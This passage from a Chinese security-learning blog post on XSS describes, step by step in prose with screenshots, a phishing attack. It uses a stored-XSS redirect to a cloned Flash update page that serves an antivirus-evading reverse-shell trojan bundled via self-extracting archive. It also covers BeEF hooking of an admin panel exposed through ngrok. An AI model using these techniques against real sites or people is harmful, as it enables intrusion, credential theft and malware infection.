+<li>
+<p>当然我们也可以直接使用 XSS 平台来实现这种效果，就是将最后那个Windows跳转的代码写入到一个模块里面，然后创建一个项目引用这个模块</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214204726774.png"></p>
+</li>
+<li>
+<p>钓鱼（合成flash -更新升级exe程序来获取管理员pc权限）【难点：免杀以及伪造】</p>
+<p>思路：下载一个flash升级页面</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214205250985.png"></p>
+<p>伪造一个flash的升级页面，想办法让他跳转到这个页面下载flash，然后我们将正常的flash软件和我们的木马进行捆绑，只要他下载升级了，我们的木马就会运行（给木马做一个免杀）</p>
+<ol>
+<li>
+<p>首先我们需要使用 MSF 生成一个反弹 shell 的 exe 可执行文件（木马 =&gt; 记得给木马做一个免杀）</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214205707291.png"></p>
+</li>
+<li>
+<p>开启监听</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214205925848.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214210000339.png"></p>
+</li>
+<li>
+<p>使用 <strong>httrack</strong> 下载 flash 的页面，方便后序进行钓鱼</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214210309971.png"></p>
+<p>其他的都做的一模一样了，唯一需要修改的就是这些参数还有这个立即下载的样式，这个就是前端的东西了，还有就是点击下载之后会跳出一个flash.exe文件的下载，这个我们也要根据原版的样式进行模拟，然后我们可以注册一个 <strong>flash.top</strong> 这种类似的域名，和我们的 VPS 绑定一下，还有就是要修改一下网站的 icon</p>
+</li>
+<li>
+<p>然后就是将 flash的那个软件和我们的木马进行捆绑</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214210920334.png"></p>
+<p>我们只需要创建一个自解压格式的压缩文件，然后修改一下压缩文件的名称就可以，他会自动生成exe类型的文件</p>
+<p>然后我们还需要修改一下他的设置</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211043171.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211101513.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211135113.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211221383.png"></p>
+<p>最后我们只需要修改一下这个新生成的文件的图标就可以</p>
+</li>
+<li>
+<p>然后就是钓鱼用的XSS代码，我们只需要将最后的地址修改为我们VPS的地址就可以</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211344725.png"></p>
+<p>使用上述的代码在XSS平台创建一个模块，然后利用这个模块创建一个项目，之后利用生成的XSS代码进行钓鱼</p>
+</li>
+<li>
+<p>我们将上面生成的XSS代码插入到留言板里面，当管理员访问后台的时候就会跳转</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211721398.png"></p>
+<p>然后我们点击立即下载，可以看到下载成功了</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211808132.png"></p>
+<p>然后我们点击运行，可以看到 flash 的软件以及木马都被执行了，后台的会话也成功建立了</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211858199.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214211913732.png"></p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<h3 id="beef-xss"><a class="markdownIt-Anchor" href="#beef-xss"></a> beef-XSS</h3>
+<p>参考文章：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53517370/article/details/128992559">beef-xss详细教程<i class="fas fa-external-link-alt"></i></a></p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214016350.png"></p>
+<p>我们需要利用上述的XSS代码进行测试，将他放到留言板插入到数据库当中</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214150203.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214241669.png"></p>
+<p>进入到管理页面可以看到XSS已经被执行了，然后我们去管理面板看看有没有上线，可以看到已经成功上线了，然后就可以进行一系列操作了，比如：可以获取到管理后台的表单、管理员的cookie、超链接等等</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214324858.png"><br>
+<img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214214545096.png"></p>
+<blockquote>
+<p>这个时候问题来了，这个 beef-xss 只能在我们本地 kali 运行起来，所以利用的地址也是我们本地的，那要怎么拿去钓鱼呢？<strong>可以使用 ngrock 进行代理转发</strong></p>
+<p>我们只需要修改一下beef的配置文件，将端口修改为 ngrock 转发到本地的端口，然后我们就可以利用 ngrock 给的公网的地址进行钓鱼了</p>
+<p><img lazyload alt="image" data-src="XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/image-20241214215100865.png"></p>
+</blockquote>
+<h3 id="xss平台的搭建"><a class="markdownIt-Anchor" href="#xss平台的搭建"></a> XSS平台的搭建</h3>
+<p>参考文章：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_64551911/article/details/124584804">手把手教你搭建XSS平台_xss平台搭建-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/web%E6%BC%8F%E6%B4%9E/">web漏洞</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/12/09/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"
+                                   title="编辑器漏洞"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">编辑器漏洞</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E7%9A%84%E5%AE%9E%E4%BE%8B"><span class="nav-text"> 跨站脚本的实例：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E5%88%86%E7%B1%BB"><span class="nav-text"> XSS分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="nav-text"> 反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-text"> 存储型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dom%E5%9E%8Bxss"><span class="nav-text"> DOM型XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-text"> XSS漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98xss"><span class="nav-text"> 手工挖掘XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss-%E7%9A%84%E7%BC%96%E7%A0%81"><span class="nav-text"> XSS 的编码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#html%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="nav-text"> html实体编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E7%B1%BB%E7%BC%96%E7%A0%81"><span class="nav-text"> 进制类编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unicode-%E7%BC%96%E7%A0%81"><span class="nav-text"> Unicode 编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98"><span class="nav-text"> 工具挖掘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss-cookie-%E7%9B%97%E5%8F%96"><span class="nav-text"> XSS cookie 盗取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E7%9B%97%E5%8F%96cookie"><span class="nav-text"> 存储型XSS盗取cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E7%9B%97%E5%8F%96cookie"><span class="nav-text"> 反射型XSS盗取cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-only-%E5%90%AF%E7%94%A8%E6%97%B6%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-text"> http-only 启用时的攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#beef-xss"><span class="nav-text"> beef-XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="nav-text"> XSS平台的搭建</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2024
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Ehiyor</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            This site is deployed on <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span>
+            
+        </div>
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E7%9A%84%E5%AE%9E%E4%BE%8B"><span class="nav-text"> 跨站脚本的实例：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E5%88%86%E7%B1%BB"><span class="nav-text"> XSS分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="nav-text"> 反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-text"> 存储型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dom%E5%9E%8Bxss"><span class="nav-text"> DOM型XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-text"> XSS漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98xss"><span class="nav-text"> 手工挖掘XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss-%E7%9A%84%E7%BC%96%E7%A0%81"><span class="nav-text"> XSS 的编码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#html%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="nav-text"> html实体编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E7%B1%BB%E7%BC%96%E7%A0%81"><span class="nav-text"> 进制类编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unicode-%E7%BC%96%E7%A0%81"><span class="nav-text"> Unicode 编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98"><span class="nav-text"> 工具挖掘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss-cookie-%E7%9B%97%E5%8F%96"><span class="nav-text"> XSS cookie 盗取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E7%9B%97%E5%8F%96cookie"><span class="nav-text"> 存储型XSS盗取cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E7%9B%97%E5%8F%96cookie"><span class="nav-text"> 反射型XSS盗取cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-only-%E5%90%AF%E7%94%A8%E6%97%B6%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-text"> http-only 启用时的攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#beef-xss"><span class="nav-text"> beef-XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="nav-text"> XSS平台的搭建</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/toggle-theme.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/code-block.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/lazyload.js"></script>
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/share.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+        
+    
+
+</body>
+</html>
